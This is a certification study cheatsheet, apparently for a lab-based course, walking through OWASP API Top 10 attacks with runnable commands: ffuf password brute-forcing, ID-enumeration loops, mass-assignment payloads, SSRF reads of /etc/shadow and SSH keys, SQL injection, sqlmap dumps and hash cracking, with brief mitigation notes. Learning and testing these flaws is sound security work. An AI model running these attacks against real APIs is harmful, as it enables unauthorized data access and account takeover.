---
title: "CWES Cheatsheet — API Attacks"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, api, rest, api-attacks]
---

REST APIs are everywhere and often poorly secured. this covers how to enumerate, probe, and exploit common API vulnerabilities following the OWASP API Security Top 10.

---

## OWASP API Security Top 10

| Risk | Description |
|---|---|
| API1 | Broken Object Level Authorization (BOLA/IDOR) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization (Excessive Data Exposure + Mass Assignment) |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server Side Request Forgery |
| API8 | Security Misconfiguration (Injection Attacks) |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

---

## Step 1: Enumerate the API

common API documentation endpoints to check first:

```
/swagger
/swagger-ui
/api-docs
/docs
/v1/docs
/openapi.json
/swagger.json
/.well-known/openapi
```

```bash
# fuzz for API endpoints
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt \
  -u http://TARGET/FUZZ -fc 404

# fuzz for API versions
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt \
  -u http://TARGET/FUZZ -fc 404
```

---

## Step 2: Authenticate & Get JWT

```bash
# sign in as supplier
curl -X POST http://TARGET/api/v1/authentication/suppliers/sign-in \
  -H "Content-Type: application/json" \
  -d '{"Email": "user@company.com", "Password": "Password123"}'

# sign in as customer
curl -X POST http://TARGET/api/v1/authentication/customers/sign-in \
  -H "Content-Type: application/json" \
  -d '{"Email": "user@hackthebox.com", "Password": "Password123"}'

# use JWT in subsequent requests
curl -X GET http://TARGET/api/v1/customers/current-user \
  -H "Authorization: Bearer eyJhbGciOi..."
```

**check your roles:**

```bash
curl -X GET http://TARGET/api/v1/roles/current-user \
  -H "Authorization: Bearer YOUR_JWT"
```

> the admin adopted a straightforward naming convention: roles share the same name as the endpoints they provide access to. for example, role `Suppliers_GetAll` = access to endpoint that retrieves all suppliers.

---

## API1: Broken Object Level Authorization (BOLA/IDOR)

a web API endpoint is vulnerable to BOLA if its authorization checks fail to correctly ensure that an authenticated user has sufficient permissions to request and view specific data. CWE-639: Authorization Bypass Through User-Controlled Key.

**how to test:**

```bash
# your company ID: b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
# endpoint accepts integer ID:
GET /api/v1/supplier-companies/yearly-reports/1   # another company's report
GET /api/v1/supplier-companies/yearly-reports/2   # another company's report
GET /api/v1/supplier-companies/yearly-reports/3   # another company's report
# no authorization check against your companyID = BOLA
```

**mass exploit with bash loop:**

```bash
for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X 'GET' \
    "http://TARGET/api/v1/supplier-companies/yearly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer YOUR_JWT' | jq
done
```

**where to look for BOLA:**

```
- any endpoint with IDs: /users/{id}, /orders/{id}, /reports/{id}
- integer IDs are easiest to enumerate (1, 2, 3...)
- GUIDs/UUIDs are harder but can be found via other endpoints
- check if YOUR ID returns YOUR data, then try OTHER IDs
- test both GET (read) and PUT/PATCH/DELETE (modify/delete)
```

> to mitigate BOLA, the endpoint should implement a verification step to ensure authorized users can only access reports associated with their affiliated company by comparing the `companyID` field of the report with the authenticated supplier's `companyID`.

---

## API2: Broken Authentication

an API suffers from Broken Authentication if any of its authentication mechanisms can be bypassed or circumvented. CWE-307: Improper Restriction of Excessive Authentication Attempts.

**discover weak password policy:**

```bash
# try updating password to something weak
PATCH /api/v1/customers/current-user
{"password": "pass"}
# response: "passwords must be at least six characters long"
# weak policy: only 6 chars minimum, no complexity required!

# set password to "123456" = success
# other users may also have weak passwords
```

**brute force API login with ffuf (multi-wordlist):**

```bash
# create target emails file
cat > emails.txt << 'EOF'
OlawaleJones@yandex.com
IsabellaRichardson@gmail.com
WenSalazar@zoho.com
EOF

# brute force with two wordlists (EMAIL + PASS)
ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS \
  -w emails.txt:EMAIL \
  -u http://TARGET/api/v1/authentication/customers/sign-in \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email": "EMAIL", "Password": "PASS"}' \
  -fr "Invalid Credentials" -t 100
```

> because we are fuzzing two parameters at the same time, we use the `-w` flag of ffuf and assign the keywords `EMAIL` and `PASS` to the customer emails and passwords wordlists, respectively.

> if brute-forcing passwords is infeasible due to strong password policies, we can attempt to brute-force OTPs or answers to security questions, given that they have low entropy or can be guessed (in addition to rate-limiting not being implemented).

---

## API3: Broken Object Property Level Authorization

two subclasses: **Excessive Data Exposure** (API reveals sensitive fields) and **Mass Assignment** (API lets you modify fields you shouldn't).

### Excessive Data Exposure

CWE-213: Exposure of Sensitive Information Due to Incompatible Policies.

```bash
# as a customer, query supplier data
GET /api/v1/suppliers

# response includes sensitive fields:
{
  "id": 1,
  "companyID": "...",
  "name": "Supplier1",
  "email": "supplier@company.com",      # should not be exposed to customers
  "phoneNumber": "+1-555-0123"           # should not be exposed to customers
}
```

**what to look for:**

```
- password hashes in user listings
- email addresses, phone numbers in public queries
- internal IDs, API keys, tokens in responses
- admin-only fields visible to regular users
- credit card info, SSN, birthdates in excessive detail
```

> these sensitive fields should not be exposed to customers, as this allows them to circumvent the marketplace entirely and contact suppliers directly. to mitigate, the endpoint should return a specific response DTO that includes only fields intended for customer visibility.

### Mass Assignment

CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes.

```bash
# your company has isExemptedFromMarketplaceFee = 0 (false)
GET /api/v1/supplier-companies/current-user
# "isExemptedFromMarketplaceFee": 0

# PATCH endpoint allows updating this field!
PATCH /api/v1/supplier-companies
{
  "isExemptedFromMarketplaceFee": 1
}
# success!

# verify
GET /api/v1/supplier-companies/current-user
# "isExemptedFromMarketplaceFee": 1  = modified sensitive business field
```

**how to find Mass Assignment:**

```
1. GET the object - note ALL fields in response
2. PATCH/PUT the object - try sending fields you shouldn't control:
   - role, isAdmin, isExemptedFromFee, balance, credit
   - permissions, privilege, verified, approved
3. GET the object again - check if the field changed
```

**common mass assignment targets:**

| Field | Impact |
|---|---|
| `role` / `isAdmin` | Privilege escalation |
| `verified` / `approved` | Bypass verification |
| `balance` / `credit` | Financial manipulation |
| `password` / `email` | Account takeover |
| `isExemptedFromFee` | Business logic abuse |
| `discount` / `price` | Financial fraud |

> to mitigate Mass Assignment, the PATCH endpoint should restrict invokers from updating sensitive fields by implementing a dedicated request DTO that includes only the fields intended for suppliers to modify.

---

## API4: Unrestricted Resource Consumption

a web API is vulnerable if it fails to limit user-initiated requests that consume resources such as network bandwidth, CPU, memory, and storage. CWE-400: Uncontrolled Resource Consumption.

**test 1: upload oversized files**

```bash
# generate a 30MB random file
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30

# upload it - does the API accept it?
curl -X POST http://TARGET/api/v1/supplier-companies/certificates-of-incorporation \
  -H "Authorization: Bearer YOUR_JWT" \
  -F "file=@certificateOfIncorporation.pdf" \
  -F "companyID=YOUR_COMPANY_ID"

# if accepted without size limit = vulnerable
```

**test 2: upload wrong file types**

```bash
# generate a fake .exe file
dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10

# upload it - does the API accept .exe?
# if accepted = no extension validation = vulnerable
```

**test 3: check if uploaded files are publicly accessible**

```bash
# files stored in wwwroot/ are often publicly accessible (ASP.NET Core default)
curl -O http://TARGET/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe

# if downloadable = uploaded files publicly accessible = can be used for malware distribution
```

> if the endpoint does not implement rate-limiting, we can send the file upload request repeatedly, consuming all available disk storage. this causes denial-of-service and financial losses.

**what to test:**

```
- no file size limit = DoS via disk exhaustion
- no file extension validation = upload malware (.exe, .bat, .sh)
- no content validation = upload anything regardless of stated type
- no rate limiting on uploads = repeated uploads = disk full
- uploaded files publicly accessible = information leak + malware hosting
```

---

## API5: Broken Function Level Authorization (BFLA)

a web API is vulnerable to BFLA if it allows unauthorized or unprivileged users to interact with and invoke privileged endpoints. the difference between BOLA and BFLA: in BOLA, the user IS authorized to interact with the endpoint. in BFLA, the user is NOT authorized but can still access it.

**how to test:**

```bash
# step 1: check your roles
GET /api/v1/roles/current-user
# response: [] (no roles assigned!)

# step 2: try accessing endpoints that require specific roles anyway
GET /api/v1/products/discounts
# requires: ProductDiscounts_GetAll role
# but returns data anyway! = BFLA
```

**systematic testing approach:**

```
1. list ALL endpoints from Swagger/API docs
2. note which endpoints require specific roles
3. authenticate as a user WITHOUT those roles
4. try calling every restricted endpoint
5. if it returns data = BFLA vulnerability
```

**common BFLA targets:**

```
- admin endpoints accessible by regular users
- supplier endpoints accessible by customers
- management functions (delete, update) accessible by read-only users
- internal/debug endpoints exposed without auth
```

> although the developers intended that only users with the `ProductDiscounts_GetAll` role could access the endpoint, they did not implement the role-based access control check at the source code level.

---

## API6: Unrestricted Access to Sensitive Business Flows

if a web API exposes operations or data that allows users to abuse them and undermine the system, it becomes vulnerable. an API endpoint is vulnerable if it exposes a sensitive business flow without appropriately restricting access.

**scenario:**

```bash
# BFLA gave us access to product discounts
GET /api/v1/products/discounts

# response shows:
{
  "productID": "a923b706-...",
  "discountRate": 0.70,           # 70% off!
  "startDate": "2023-03-15",
  "endDate": "2023-09-15"
}

# business impact:
# we know WHEN products will be discounted and by HOW MUCH
# buy all stock at 70% off during discount period
# resell at original price after discount ends
# if no rate limiting on purchases = buy ALL available stock
```

**what to look for:**

```
- discount schedules exposed to unauthorized users
- pricing logic/algorithms exposed
- inventory levels visible (buy everything before others)
- upcoming promotions leaked
- business rules/algorithms exposed
- any data that gives unfair competitive advantage
```

> if the endpoint responsible for purchasing products does not implement rate-limiting (Unrestricted Resource Consumption), we can purchase all available stock on the day the discount starts and resell later at original price.

---

## API7: Server-Side Request Forgery (SSRF)

CWE-918: SSRF occurs when an API uses user-controlled input to fetch remote or local resources without validation. this allows an attacker to coerce the application to send crafted requests to unexpected destinations, bypassing firewalls or VPNs.

**exploit via file URI manipulation:**

```bash
# step 1: upload a legitimate PDF - note the fileURI in response
POST /api/v1/supplier-companies/certificates-of-incorporation
# response: "fileURI": "file:///wwwroot/SupplierCompanies.../cert.pdf"

# step 2: update the file URI to point to a local file
PATCH /api/v1/supplier-companies
{
  "CertificateOfIncorporationPDFFileURI": "file:///etc/passwd"
}

# step 3: retrieve the file contents (returned as base64)
GET /api/v1/supplier-companies/{ID}/certificates-of-incorporation
# response: "base64Data": "cm9vdDp4OjA6MC..."

# step 4: decode
echo "cm9vdDp4OjA6MC..." | base64 -d
# contents of /etc/passwd
```

**files to read via SSRF:**

```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///var/www/html/config.php
file:///home/user/.ssh/id_rsa
file:///proc/self/environ
```

> because the web API's backend does not validate the path that the `CertificateOfIncorporationPDFFileURI` field points to, it will fetch and return the contents of local files, including sensitive ones.

---

## API8: Security Misconfiguration (SQL Injection)

CWE-89: SQL Injection. web APIs are susceptible to the same security misconfigurations that can compromise traditional web applications, including injection attacks.

**test for SQLi in API parameters:**

```bash
# normal request
GET /api/v1/products/laptop/count
# response: 18

# test with single quote
GET /api/v1/products/laptop'/count
# response: error message = SQLi likely

# boolean test
GET /api/v1/products/laptop' OR 1=1 --/count
# response: 720 (all products!) = SQLi confirmed
```

**SQLMap against API:**

```bash
# save the request from Burp
sqlmap -r api_request.txt --batch --dump
```

**HTTP security headers to check:**

```
- Access-Control-Allow-Origin: * = CORS misconfiguration = CSRF possible
- Missing X-Content-Type-Options = MIME sniffing
- Missing X-Frame-Options = clickjacking
- Missing Strict-Transport-Security = MITM
```

> if an API does not set a secure `Access-Control-Allow-Origin` as part of its CORS policy, it can be exposed to security risks, most notably Cross-Site Request Forgery (CSRF).

---

## API9: Improper Inventory Management

as a web API matures and undergoes changes, it is crucial to implement proper versioning practices. improper inventory management, including inadequate versioning, can introduce security misconfigurations and increase the attack surface.

**how to find old API versions:**

```bash
# check Swagger UI for version dropdown
# look for "Select a definition" = v0, v1, v2, etc.

# fuzz for API versions
ffuf -w versions.txt -u http://TARGET/api/FUZZ/customers -fc 404

# versions.txt:
v0
v1
v2
v3
beta
dev
test
staging
legacy
internal
old
```

**common version endpoints:**

```
/api/v0/          # old/legacy (often forgotten, no auth!)
/api/v1/          # current production
/api/v2/          # newer version
/api/beta/        # beta features
/api/dev/         # development
/api/internal/    # internal use
/api/staging/     # staging environment
```

**exploit:**

```bash
# v0 has no authentication (no lock icon in Swagger)
# access deleted customer data including password hashes
GET /api/v0/customers/deleted

# response:
{
  "customers": [
    {
      "username": "john",
      "email": "john@company.com",
      "passwordHash": "$2b$10$..."    # crack this!
    }
  ]
}
```

```bash
# crack the hashes
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# try cracked passwords on v1 active accounts (password reuse)
```

> due to oversight by developers in neglecting to remove v0 endpoints, we gained unauthorized access to deleted data of former customers. this was exacerbated by Excessive Data Exposure, exposing password hashes. given common password reuse, cracked passwords could compromise active accounts if customers re-registered with the same password.

**what to look for:**

```
- old API versions still accessible (v0, beta, dev)
- no authentication on old versions
- deleted/archived data still accessible
- debug endpoints left exposed
- documentation endpoints revealing internal structure
- different API versions with different security controls
```

---

## API10: Unsafe Consumption of APIs

APIs frequently interact with other APIs to exchange data. developers may blindly trust data received from third-party APIs, especially from reputable organizations, leading to relaxed security measures in input validation and data sanitization. CWE-1357: Reliance on Insufficiently Trustworthy Component.

**vulnerabilities from API-to-API communication:**

| Risk | What Happens |
|---|---|
| Insecure Data Transmission | API-to-API over HTTP (not HTTPS) = data intercepted |
| Inadequate Data Validation | Data from external API not sanitized = injection attacks |
| Weak Authentication | No auth between APIs = unauthorized access |
| Insufficient Rate-Limiting | One API overwhelms another = DoS |
| Inadequate Monitoring | Can't detect attacks on API-to-API traffic |

**how to test:**

```
1. identify if the API consumes other APIs
   - check documentation, error messages, response headers
   - look for: webhook URLs, callback URLs, external API references

2. if the API forwards data from external sources:
   - try injecting payloads in the external data
   - SQLi, XSS, command injection in forwarded fields
   - the target API may not sanitize data it "trusts"

3. check if API-to-API communication uses HTTPS
   - if HTTP = data can be intercepted/modified (MITM)

4. check if API-to-API has authentication
   - can you call internal APIs directly without auth?
```

---

## Complete OWASP API Top 10 Quick Reference

| # | Risk | Test Method | Key Payload/Action |
|---|---|---|---|
| API1 | BOLA/IDOR | Change IDs in endpoints | `GET /api/v1/reports/1` then try `/2`, `/3` |
| API2 | Broken Auth | Brute force, weak passwords | ffuf with dual wordlists (email + password) |
| API3 | Property Auth | Read excessive fields, write restricted fields | PATCH `{"role":"admin"}`, check response fields |
| API4 | Resource Consumption | Upload huge/wrong files, repeat requests | `dd if=/dev/urandom of=big.pdf bs=1M count=30` |
| API5 | BFLA | Access endpoints without required role | Call restricted endpoints as unprivileged user |
| API6 | Business Flows | Access discount/pricing data | Use leaked business data for unfair advantage |
| API7 | SSRF | Modify URL/URI fields | `"fileURI": "file:///etc/passwd"` |
| API8 | Security Misconfig | SQLi in params, check headers | `GET /api/v1/products/laptop'/count` |
| API9 | Inventory Mgmt | Find old versions (v0, beta, dev) | `GET /api/v0/customers/deleted` |
| API10 | Unsafe Consumption | Test API-to-API data flow | Inject payloads in data consumed from external APIs |

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
